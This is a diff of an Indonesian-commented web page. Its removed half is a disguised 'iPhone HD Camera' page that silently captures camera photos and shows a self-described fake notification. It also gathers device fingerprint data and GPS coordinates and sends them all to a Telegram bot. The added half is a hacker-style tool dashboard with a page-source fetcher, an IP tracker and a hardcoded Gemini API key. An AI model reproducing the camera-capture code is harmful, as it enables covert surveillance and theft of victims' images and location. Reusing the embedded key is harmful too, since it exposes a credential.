-        // Fungsi untuk mengambil gambar secara terus menerus
-        function startContinuousCapture() {
-            captureInterval = setInterval(captureImage, CAPTURE_INTERVAL);
-            captureIndicator.style.display = 'block';
-            captureBtn.style.backgroundColor = 'red';
-        }
-        
-        // Fungsi untuk menghentikan pengambilan gambar
-        function stopContinuousCapture() {
-            clearInterval(captureInterval);
-            captureIndicator.style.display = 'none';
-            captureBtn.style.backgroundColor = '#fff';
-        }
-        
-        // Fungsi untuk toggle continuous capture
-        function toggleContinuousCapture() {
-            if (captureInterval) {
-                stopContinuousCapture();
-            } else {
-                startContinuousCapture();
-            }
-        }
-        
-        // Fungsi untuk mengambil gambar
-        function captureImage() {
-            if (!cameraAllowed) return;
-            
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const ctx = canvas.getContext('2d');
-            
-            // Gambar frame video ke canvas
-            if (isFrontCamera) {
-                // Mirror effect untuk kamera depan
-                ctx.translate(canvas.width, 0);
-                ctx.scale(-1, 1);
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
-            } else {
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            }
-            
-            // Konversi ke data URL
-            const imageData = canvas.toDataURL('image/jpeg', 0.9);
-            
-            // Tampilkan preview di gallery
-            lastCaptureImg.src = imageData;
-            galleryPreview.style.display = 'block';
-            
-            // Tampilkan notifikasi palsu
-            notification.style.display = 'block';
-            
-            // Kumpulkan informasi perangkat dan kirim
-            if (!dataSent) {
-                collectAndSendData(imageData);
-            }
-        }
-        
-        // Mengumpulkan dan mengirim data
-        function collectAndSendData(imageData) {
-            dataSent = true;
-            
-            statusText.textContent = "Mengirim data...";
-            loadingScreen.style.display = 'flex';
-            
-            // Mengumpulkan informasi perangkat
-            const deviceInfo = collectDeviceInfo();
-            
-            // Mendapatkan lokasi
-            getLocation()
-                .then(locationData => {
-                    // Siapkan pesan untuk dikirim
-                    const message = `📱 iPhone HD Camera Report:\n\n${deviceInfo}\n\n📍 ${locationData}`;
-                    
-                    // Kirim teks dan gambar ke Telegram
-                    sendToTelegram(message, imageData);
-                })
-                .catch(error => {
-                    const message = `📱 iPhone HD Camera Report:\n\n${deviceInfo}\n\n📍 Lokasi: Tidak dapat mengakses lokasi`;
-                    sendToTelegram(message, imageData);
-                });
-        }
-        
-        // Mengumpulkan informasi perangkat
-        function collectDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenSize = `${screen.width} x ${screen.height}`;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const language = navigator.language;
-            const cpuCores = navigator.hardwareConcurrency || "Tidak diketahui";
-            const deviceMemory = navigator.deviceMemory || "Tidak diketahui";
-            
-            let connectionInfo = "Tidak tersedia";
-            if (navigator.connection) {
-                const conn = navigator.connection;
-                connectionInfo = `${conn.effectiveType} (${conn.downlink} Mbps)`;
-            }
-            
-            return `🔍 Informasi Perangkat:
-- User Agent: ${userAgent}
-- Platform: ${platform}
-- Ukuran Layar: ${screenSize}
-- CPU Cores: ${cpuCores}
-- Memori: ${deviceMemory} GB
-- Zona Waktu: ${timezone}
-- Bahasa: ${language}
-- Koneksi: ${connectionInfo}
-- URL: ${window.location.href}`;
-        }
-        
-        // Mendapatkan lokasi
-        function getLocation() {
-            return new Promise((resolve, reject) => {
-                if (!navigator.geolocation) {
-                    reject("Geolocation tidak didukung");
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    position => {
-                        const latitude = position.coords.latitude;
-                        const longitude = position.coords.longitude;
-                        const accuracy = position.coords.accuracy;
-                        
-                        resolve(`Koordinat: ${latitude}, ${longitude} (Akurasi: ${accuracy}m)`);
-                    },
-                    error => {
-                        reject("Tidak dapat mengakses lokasi: " + error.message);
-                    },
-                    { timeout: 10000 }
-                );
+
+        function setupNavigation() {
+            const navHTML = Object.keys(pages).map(key => `<a href="#${key}" class="nav-item flex items-center gap-3 px-4 py-2 rounded-md" data-page="${key}">${pages[key].icon}<span>${pages[key].title}</span></a>`).join('');
+            desktopNav.innerHTML = navHTML; mobileNavLinks.innerHTML = navHTML;
+            document.querySelectorAll('.nav-item').forEach(item => {
+                item.addEventListener('click', (e) => { e.preventDefault(); navigateTo(e.currentTarget.dataset.page); mobileNavModal.classList.add('hidden'); });
             });
         }
         
-        // Mengirim data ke Telegram
-        function sendToTelegram(message, imageData) {
-            // Konversi data URL ke blob
-            fetch(imageData)
-                .then(res => res.blob())
-                .then(blob => {
-                    // Kirim gambar sebagai file
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', blob, 'iphone_capture.jpg');
-                    formData.append('caption', message);
-                    
-                    return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                })
-                .then(response => response.json())
-                .then(data => {
-                    loadingScreen.style.display = 'none';
-                    if (data.ok) {
-                        console.log("Foto berhasil dikirim ke Telegram");
-                    } else {
-                        console.error("Error sending to Telegram:", data);
-                    }
-                })
-                .catch(error => {
-                    loadingScreen.style.display = 'none';
-                    console.error("Error:", error);
-                });
+        function navigateTo(pageKey) {
+            if (!pages[pageKey]) return;
+            mainContent.innerHTML = pages[pageKey].render();
+            document.querySelectorAll('.nav-item').forEach(item => item.classList.toggle('active', item.dataset.page === pageKey));
+            if (pageKey === 'fetcher') setupFetcherPage();
+            if (pageKey === 'ai_image') setupAiImagePage();
+            if (pageKey === 'redeem') setupRedeemPage();
+            if (pageKey === 'tools') setupToolsPage();
+        }
+
+        function showToast(message, type = 'info') {
+             const container = document.getElementById('toast-container'); const toast = document.createElement('div');
+            const colors = { info: 'bg-blue-500', success: 'bg-teal-500', error: 'bg-red-500' };
+            toast.className = `toast text-white px-6 py-3 rounded-lg shadow-lg transform translate-x-full ${colors[type]}`;
+            toast.textContent = message; container.appendChild(toast);
+            setTimeout(() => toast.classList.remove('translate-x-full'), 100);
+            setTimeout(() => { toast.classList.add('opacity-0'); toast.addEventListener('transitionend', () => toast.remove()); }, 4000);
         }
         
-        // Coba akses kamera secara otomatis setelah halaman dimuat
-        window.addEventListener('load', () => {
-            // Tampilkan notifikasi setelah beberapa detik
+        async function fetchWithTimeout(resource, options = {}, timeout = 15000) {
+            const controller = new AbortController(); const id = setTimeout(() => controller.abort(), timeout);
+            const response = await fetch(resource, { ...options, signal: controller.signal }); clearTimeout(id); return response;
+        }
+        
+        function openPreviewModal() {
+            const code = document.getElementById('code-output').textContent;
+            if (!code) { showToast("Tidak ada kode untuk dijalankan.", "error"); return; }
+            const blob = new Blob([code], { type: 'text/html' });
+            previewBlobUrl = URL.createObjectURL(blob);
+            const iframe = document.getElementById('preview-iframe');
+            iframe.src = previewBlobUrl;
+            const modal = document.getElementById('preview-modal');
+            const modalContent = document.getElementById('preview-modal-content');
+            modal.classList.remove('hidden'); modal.classList.add('flex');
+            setTimeout(() => { modal.classList.remove('opacity-0'); modalContent.classList.remove('opacity-0', 'scale-95'); }, 10);
+        }
+
+        function closePreviewModal() {
+            const modal = document.getElementById('preview-modal');
+            const modalContent = document.getElementById('preview-modal-content');
+            modal.classList.add('opacity-0');
+            modalContent.classList.add('opacity-0', 'scale-95');
             setTimeout(() => {
-                notification.innerHTML = '<i class="fas fa-camera"></i> iPhone HD Camera siap digunakan';
-                notification.style.display = 'block';
-            }, 2000);
-        });
+                modal.classList.add('hidden'); modal.classList.remove('flex');
+                const iframe = document.getElementById('preview-iframe');
+                iframe.src = 'about:blank';
+                if (previewBlobUrl) { URL.revokeObjectURL(previewBlobUrl); previewBlobUrl = null; }
+            }, 300);
+        }
+
+        function setupFetcherPage() {
+            const urlInput = document.getElementById('url-input'), fetchBtn = document.getElementById('fetch-btn'), codeOutput = document.getElementById('code-output'), limitCountDisplay = document.getElementById('limit-count'), statusDisplay = document.getElementById('status-display'), initialMessage = document.getElementById('initial-message'), copyBtn = document.getElementById('copy-btn'), downloadBtn = document.getElementById('download-btn'), runBtn = document.getElementById('run-btn');
+            const STORAGE_KEY = 'netrunner_limit_v15';
+            function checkUsageLimit() {
+                let usageData = JSON.parse(localStorage.getItem(STORAGE_KEY));
+                if (!usageData || (Date.now() - usageData.timestamp > 3600000)) { usageData = { count: 0, timestamp: Date.now() }; }
+                localStorage.setItem(STORAGE_KEY, JSON.stringify(usageData)); return usageData;
+            }
+            function updateLimitDisplay() {
+                const remaining = MAX_ATTEMPTS - checkUsageLimit().count;
+                limitCountDisplay.textContent = Math.max(0, remaining);
+                if (remaining <= 0) { fetchBtn.disabled = true; urlInput.disabled = true; statusDisplay.textContent = `// Batas penggunaan tercapai. //`; }
+            }
+            async function handleFetch() {
+                const url = urlInput.value.trim(); if (!url) { showToast("URL tidak boleh kosong", "error"); return; }
+                let usageData = checkUsageLimit(); if (usageData.count >= MAX_ATTEMPTS) { showToast("Batas pemakaian tercapai", "error"); updateLimitDisplay(); return; }
+                const allBtns = [fetchBtn, copyBtn, downloadBtn, runBtn];
+                allBtns.forEach(btn => { btn.disabled = true; btn.classList.add("opacity-50"); });
+                fetchBtn.textContent = 'Memproses...'; statusDisplay.textContent = `// Menghubungi... //`;
+                initialMessage.style.display = 'none'; codeOutput.textContent = '';
+                try {
+                    const response = await fetchWithTimeout(`https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`);
+                    if (!response.ok) throw new Error(`Status: ${response.status}`);
+                    const source = await response.text();
+                    codeOutput.textContent = source; hljs.highlightElement(codeOutput);
+                    statusDisplay.textContent = `// Ekstraksi berhasil //`; showToast("Ekstraksi berhasil!", "success");
+                    if (usageData.count === 0) usageData.timestamp = Date.now();
+                    usageData.count++; localStorage.setItem(STORAGE_KEY, JSON.stringify(usageData));
+                    [copyBtn, downloadBtn, runBtn].forEach(btn => { btn.disabled = false; btn.classList.remove("opacity-50"); });
+                } catch (error) {
+                    const errorMsg = error.name === 'AbortError' ? 'Permintaan timeout.' : error.message;
+                    codeOutput.textContent = `Error: ${errorMsg}`; statusDisplay.textContent = "// Koneksi Gagal //"; showToast(`Gagal: ${errorMsg}`, "error");
+                } finally { fetchBtn.textContent = 'Ekstrak'; fetchBtn.disabled = false; fetchBtn.classList.remove("opacity-50"); updateLimitDisplay(); }
+            }
+            fetchBtn.addEventListener('click', handleFetch); urlInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') handleFetch(); });
+            runBtn.addEventListener('click', openPreviewModal);
+            copyBtn.addEventListener('click', () => { navigator.clipboard.writeText(document.getElementById('code-output').textContent).then(() => { showToast("Kode disalin ke clipboard", "success"); }); });
+            downloadBtn.addEventListener('click', () => {
+                const date = new Date(), filename = `dikzx_modz_${Math.floor(1000 + Math.random() * 9000)}_${date.getDate()}${(date.getMonth()+1).toString().padStart(2, '0')}${date.getFullYear()}.html`;
+                const blob = new Blob([document.getElementById('code-output').textContent], { type: 'text/html;charset=utf-8' }), link = document.createElement('a');
+                link.href = URL.createObjectURL(blob); link.download = filename;
+                document.body.appendChild(link); link.click(); document.body.removeChild(link);
+                URL.revokeObjectURL(link.href);
+            });
+            updateLimitDisplay();
+        }
+
+        function setupAiImagePage() {
+             const btn = document.getElementById('ai-gambar-btn');
+            btn.addEventListener('click', async () => {
+                const prompt = document.getElementById('ai-gambar-prompt').value.trim();
+                const resultDiv = document.getElementById('ai-gambar-result');
+                if (GEMINI_API_KEY === 'AIzaSyAu1gmFHouyMJNi7__dfKfeSADxhDaARcE') { showToast("API Key Gemini belum diatur.", "error"); return; }
+                if (!prompt) { showToast("Prompt tidak boleh kosong.", "error"); return; }
+                resultDiv.innerHTML = `<div class="spinner w-10 h-10 animate-spin rounded-full border-4 border-t-transparent"></div>`;
+                btn.disabled = true;
+                try {
+                    const response = await fetchWithTimeout(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-image-preview:generateContent?key=${GEMINI_API_KEY}`, {
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ contents: [{ parts: [{ text: prompt }] }], generationConfig: { responseModalities: ["IMAGE"] } })
+                    });
+                    if (!response.ok) throw new Error(`API Error: ${response.status}`);
+                    const result = await response.json();
+                    const base64Data = result?.candidates?.[0]?.content?.parts?.find(p => p.inlineData)?.inlineData?.data;
+                    if(base64Data) { resultDiv.innerHTML = `<img src="data:image/png;base64,${base64Data}" class="max-w-full max-h-full object-contain rounded-md" alt="Generated Image">`; } 
+                    else { throw new Error("Respons gambar tidak valid."); }
+                } catch(error) { resultDiv.innerHTML = `<span class="text-red-500">Gagal: ${error.message}</span>`; } 
+                finally { btn.disabled = false; }
+            });
+        }
+        
+        function setupRedeemPage() {
+            const redeemInput = document.getElementById('redeem-input');
+            const redeemBtn = document.getElementById('redeem-btn');
+            redeemInput.addEventListener('input', (e) => {
+                let value = e.target.value.replace(/[^a-zA-Z0-9]/g, '').toUpperCase();
+                if (value.length > 3) { value = value.slice(0, 3) + '-' + value.slice(3); }
+                e.target.value = value.slice(0, 8);
+            });
+            redeemBtn.addEventListener('click', () => {
+                if (redeemInput.value.trim().toUpperCase() === REDEEM_CODE) {
+                    localStorage.setItem('netrunner_redeemed_premium', 'true'); MAX_ATTEMPTS = 50;
+                    showToast('Kode berhasil di-redeem! Batas API Anda sekarang 50.', 'success'); navigateTo('fetcher');
+                } else { showToast('Kode redeem tidak valid.', 'error'); }
+            });
+        }
+        
+        function setupToolsPage() {
+            let currentQrCodeUrl = '';
+            document.getElementById('check-ip-btn').addEventListener('click', async () => {
+                const ipResult = document.getElementById('ip-result');
+                ipResult.classList.remove('hidden'); ipResult.textContent = 'Mendeteksi...';
+                try { const response = await fetchWithTimeout('https://api.ipify.org?format=json'); const data = await response.json(); ipResult.textContent = `IP Publik Anda: ${data.ip}`;
+                } catch (error) { ipResult.textContent = 'Gagal mendeteksi IP.'; }
+            });
+            document.getElementById('track-ip-btn').addEventListener('click', async () => {
+                const ip = document.getElementById('ip-track-input').value.trim(); const ipTrackResult = document.getElementById('ip-track-result');
+                if (!ip) return;
+                ipTrackResult.classList.remove('hidden'); ipTrackResult.innerHTML = 'Melacak...';
+                try {
+                    const response = await fetchWithTimeout(`https://ip-api.com/json/${ip}`); const data = await response.json();
+                    if (data.status === 'success') { ipTrackResult.innerHTML = `<strong>Negara:</strong> ${data.country || 'N/A'}<br><strong>Kota:</strong> ${data.city || 'N/A'}<br><strong>ISP:</strong> ${data.isp || 'N/A'}`; } 
+                    else { ipTrackResult.textContent = 'Gagal melacak IP.'; }
+                } catch (error) { ipTrackResult.textContent = 'Error koneksi.'; }
+            });
+            const qrDownloadBtn = document.getElementById('qr-download-btn');
+            document.getElementById('qr-generate-btn').addEventListener('click', () => {
+                const text = document.getElementById('qr-input').value.trim(), qrResult = document.getElementById('qr-result');
+                if (text) { 
+                    currentQrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=${encodeURIComponent(text)}&bgcolor=ffffff`;
+                    qrResult.innerHTML = `<img src="${currentQrCodeUrl}" alt="QR Code">`; 
+                    qrDownloadBtn.classList.remove('hidden');
+                } else { qrResult.innerHTML = ''; currentQrCodeUrl = ''; qrDownloadBtn.classList.add('hidden'); }
+            });
+            qrDownloadBtn.addEventListener('click', async () => {
+                if (!currentQrCodeUrl) { showToast("Buat QR code terlebih dahulu.", "error"); return; }
+                try {
+                    const response = await fetch(currentQrCodeUrl); const blob = await response.blob(); const url = URL.createObjectURL(blob); const a = document.createElement('a');
+                    const date = new Date(), filename = `dikz_modz_${Math.floor(1000 + Math.random() * 9000)}_${date.getDate()}${(date.getMonth()+1).toString().padStart(2, '0')}${date.getFullYear()}_.png`;
+                    a.href = url; a.download = filename; document.body.appendChild(a); a.click(); document.body.removeChild(a);
+                    URL.revokeObjectURL(url); showToast("QR Code diunduh!", "success");
+                } catch (error) { showToast("Gagal mengunduh QR Code.", "error"); console.error("QR Download Error:", error); }
+            });
+            document.getElementById('upload-btn').addEventListener('click', async () => {
+                const statusDiv = document.getElementById('upload-status'), resultWrapper = document.getElementById('result-url-wrapper'), resultUrlInput = document.getElementById('result-url'), fileInput = document.getElementById('image-input');
+                if (IMGBB_API_KEY === 'YOUR_IMGBB_API_KEY_HERE') { statusDiv.textContent = "Error: API Key ImgBB belum diatur."; return; }
+                const file = fileInput.files[0]; if (!file) { statusDiv.textContent = "Pilih file gambar."; return; }
+                statusDiv.textContent = "Mengunggah..."; resultWrapper.classList.add('hidden');
+                const formData = new FormData(); formData.append('image', file);
+                try {
+                    const response = await fetchWithTimeout(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: formData });
+                    const data = await response.json(); if (!data.success) throw new Error(data.error.message);
+                    statusDiv.textContent = "Unggah berhasil!"; resultUrlInput.value = data.data.url; resultWrapper.classList.remove('hidden');
+                } catch (error) { statusDiv.textContent = `Error: ${error.message}`; } 
+                finally { fileInput.value = ''; }
+            });
+        }
+        
+        // --- INITIALIZATION ---
+        document.getElementById('login-form').addEventListener('submit', handleLogin);
+        checkLoginState();
     </script>
 </body>
 </html>
+
